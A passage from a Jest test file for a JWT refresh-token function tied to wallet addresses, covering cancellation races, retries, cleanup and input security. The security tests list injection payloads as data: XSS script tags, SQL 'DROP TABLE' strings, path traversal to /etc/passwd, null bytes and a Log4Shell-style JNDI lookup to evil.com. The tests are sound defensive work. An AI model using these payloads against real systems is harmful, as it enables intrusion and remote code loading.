          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };

        mockCommonApiPost.mockImplementation(async () => {
          // Simulate a very fast response that might race with cancellation
          await new Promise(resolve => setTimeout(resolve, 1));
          return mockResponse;
        });

        // Start the request
        const refreshPromise = redeemRefreshTokenWithRetries(
          '0x1234567890123456789012345678901234567890',
          'refresh-token',
          null,
          3,
          abortController.signal
        );

        // Cancel almost immediately
        setTimeout(() => abortController.abort(), 5);

        try {
          const result = await refreshPromise;
          // If we get here, the request completed before cancellation
          expect(result).toEqual(mockResponse);
        } catch (error) {
          // If we get here, the cancellation won the race
          expect(error).toBeInstanceOf(TokenRefreshCancelledError);
        }
      });

      it('should handle concurrent requests with different retry counts', async () => {
        const serverError = { status: 500, message: 'Server error' };
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };

        // First request: fails 2 times, succeeds on 3rd
        // Second request: fails 1 time, succeeds on 2nd  
        // Third request: always fails
        let call1Count = 0;
        let call2Count = 0;
        let call3Count = 0;

        mockCommonApiPost.mockImplementation(async (options: any) => {
          const token = options.body.token;
          
          if (token === 'token1') {
            call1Count++;
            if (call1Count <= 2) throw serverError;
            return mockResponse;
          } else if (token === 'token2') {
            call2Count++;
            if (call2Count <= 1) throw serverError;
            return mockResponse;
          } else {
            call3Count++;
            throw serverError;
          }
        });

        const promises = [
          redeemRefreshTokenWithRetries('0x1234567890123456789012345678901234567890', 'token1', null, 3),
          redeemRefreshTokenWithRetries('0x1234567890123456789012345678901234567890', 'token2', null, 2),
          redeemRefreshTokenWithRetries('0x1234567890123456789012345678901234567890', 'token3', null, 2),
        ];

        const results = await Promise.allSettled(promises);

        expect(results[0].status).toBe('fulfilled');
        expect(results[1].status).toBe('fulfilled');
        expect(results[2].status).toBe('rejected');
        
        expect(call1Count).toBe(3); // 2 failures + 1 success
        expect(call2Count).toBe(2); // 1 failure + 1 success
        expect(call3Count).toBe(2); // 2 failures, no success
      });
    });

    describe('performance tests', () => {
      it('should not create memory leaks with AbortSignal listeners', async () => {
        const abortController = new AbortController();
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };
        mockCommonApiPost.mockResolvedValue(mockResponse);

        // Run multiple times to check for leaks
        for (let i = 0; i < 100; i++) {
          await redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            1,
            abortController.signal
          );
        }

        // If there were memory leaks, this test would consume excessive memory
        expect(mockCommonApiPost).toHaveBeenCalledTimes(100);
      });

      it('should clean up resources properly on success', async () => {
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };
        mockCommonApiPost.mockResolvedValue(mockResponse);

        const result = await redeemRefreshTokenWithRetries(
          '0x1234567890123456789012345678901234567890',
          'refresh-token',
          null,
          3
        );

        expect(result).toEqual(mockResponse);
        // No lingering promises or timers
      });

      it('should clean up resources properly on failure', async () => {
        const error = { status: 500, message: 'Server error' };
        mockCommonApiPost.mockRejectedValue(error);

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            3
          )
        ).rejects.toThrow(TokenRefreshServerError);

        // No lingering promises or timers
      });
    });

    describe('security tests', () => {
      it('should reject tokens with potential injection attacks', async () => {
        const maliciousTokens = [
          '<script>alert("xss")</script>',
          'javascript:alert("xss")',
          '"; DROP TABLE users; --',
          '${jndi:ldap://evil.com/x}',
          '../../etc/passwd',
          'data:text/html,<script>alert("xss")</script>',
          'null\x00byte',
          'unicode\u0000null',
        ];

        for (const maliciousToken of maliciousTokens) {
          await expect(
            redeemRefreshTokenWithRetries(
              '0x1234567890123456789012345678901234567890',
              maliciousToken,
              null,
              1
            )
          ).rejects.toThrow(TokenRefreshError);
        }
      });

      it('should reject addresses with potential injection attacks', async () => {
        const maliciousAddresses = [
          '<script>alert("xss")</script>',
          'javascript:alert("xss")',
          '0x1234567890123456789012345678901234567890"><script>alert("xss")</script>',
          '0x1234567890123456789012345678901234567890; DROP TABLE users; --',
          'null\x00byte',
          'unicode\u0000null',
          '../../etc/passwd',
        ];

        mockIsAddress.mockReturnValue(false);

        for (const maliciousAddress of maliciousAddresses) {
          await expect(
            redeemRefreshTokenWithRetries(
              maliciousAddress,
              'refresh-token',
              null,
              1
            )
          ).rejects.toThrow(TokenRefreshError);
        }
      });

      it('should reject role with potential injection attacks', async () => {
        const maliciousRoles = [
          '<script>alert("xss")</script>',
          'javascript:alert("xss")',
          '"; DROP TABLE users; --',
          '${jndi:ldap://evil.com/x}',
          'admin\'; DROP TABLE users; --',
          'null\x00byte',
          'unicode\u0000null',
        ];

        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };
        mockCommonApiPost.mockResolvedValue(mockResponse);

        for (const maliciousRole of maliciousRoles) {
          // These should pass input validation but be sanitized at API level
          const result = await redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            maliciousRole,
            1
          );

          expect(result).toEqual(mockResponse);
          expect(mockCommonApiPost).toHaveBeenCalledWith(
            expect.objectContaining({
              body: expect.objectContaining({
                role: maliciousRole,
              }),
            })
          );
        }
      });

      it('should handle extremely long inputs safely', async () => {
        const veryLongString = 'a'.repeat(10000);
        const veryLongAddress = '0x' + '1'.repeat(9998);
        
        mockIsAddress.mockReturnValue(false);

        await expect(
          redeemRefreshTokenWithRetries(
            veryLongAddress,
            'refresh-token',
            null,
            1
          )
        ).rejects.toThrow('Invalid wallet address format');

        await expect(
          redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            veryLongString,
            null,
            1
          )
        ).rejects.toThrow(TokenRefreshError);
      });

      it('should sanitize error messages to prevent information disclosure', async () => {
        const sensitiveErrorData = {
          password: 'secret123',
          apiKey: 'sk-1234567890abcdef',
          privateKey: '0xabcdef1234567890',
          status: 500,
          message: 'Internal server error with sensitive data',
        };

        mockCommonApiPost.mockRejectedValue(sensitiveErrorData);

        try {
          await redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            'refresh-token',
            null,
            1
          );
        } catch (error: any) {
          // Error message should not contain sensitive data
          expect(error.message).not.toContain('secret123');
          expect(error.message).not.toContain('sk-1234567890abcdef');
          expect(error.message).not.toContain('0xabcdef1234567890');
          expect(error).toBeInstanceOf(TokenRefreshServerError);
        }
      });

      it('should prevent timing attacks through consistent error responses', async () => {
        const startTime = Date.now();
        
        // Test with invalid address (should fail fast)
        try {
          await redeemRefreshTokenWithRetries(
            'invalid-address',
            'refresh-token',
            null,
            1
          );
        } catch (error) {
          // Expected to throw
        }
        
        const invalidAddressTime = Date.now() - startTime;
        
        // Test with invalid token (should also fail fast)
        const startTime2 = Date.now();
        try {
          await redeemRefreshTokenWithRetries(
            '0x1234567890123456789012345678901234567890',
            '',
            null,
            1
          );
        } catch (error) {
          // Expected to throw
        }
        
        const invalidTokenTime = Date.now() - startTime2;
        
        // Both should fail in similar timeframes (within 100ms of each other)
        // This prevents attackers from determining which validation failed
        expect(Math.abs(invalidAddressTime - invalidTokenTime)).toBeLessThan(100);
      });
    });

    describe('type safety tests', () => {
      it('should maintain proper TypeScript types throughout', async () => {
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
        };
        mockCommonApiPost.mockResolvedValue(mockResponse);

        const result = await redeemRefreshTokenWithRetries(
          '0x1234567890123456789012345678901234567890',
          'refresh-token',
          null,
          3
        );

        // TypeScript should infer these types correctly
        const token: string = result.token;
        const address: string = result.address;

        expect(token).toBe('new-jwt-token');
        expect(address).toBe('0x1234567890123456789012345678901234567890');
      });

      it('should handle type assertions safely', async () => {
        const mockResponse = {
          token: 'new-jwt-token',
          address: '0x1234567890123456789012345678901234567890',
          // Additional fields that might be in the response
          refresh_token: 'new-refresh-token',
          expires_in: 3600,
        };
        mockCommonApiPost.mockResolvedValue(mockResponse);

        const result = await redeemRefreshTokenWithRetries(
          '0x1234567890123456789012345678901234567890',
          'refresh-token',
          null,
          3
        );

        expect(result).toHaveProperty('token');
        expect(result).toHaveProperty('address');
      });
    });
  });
});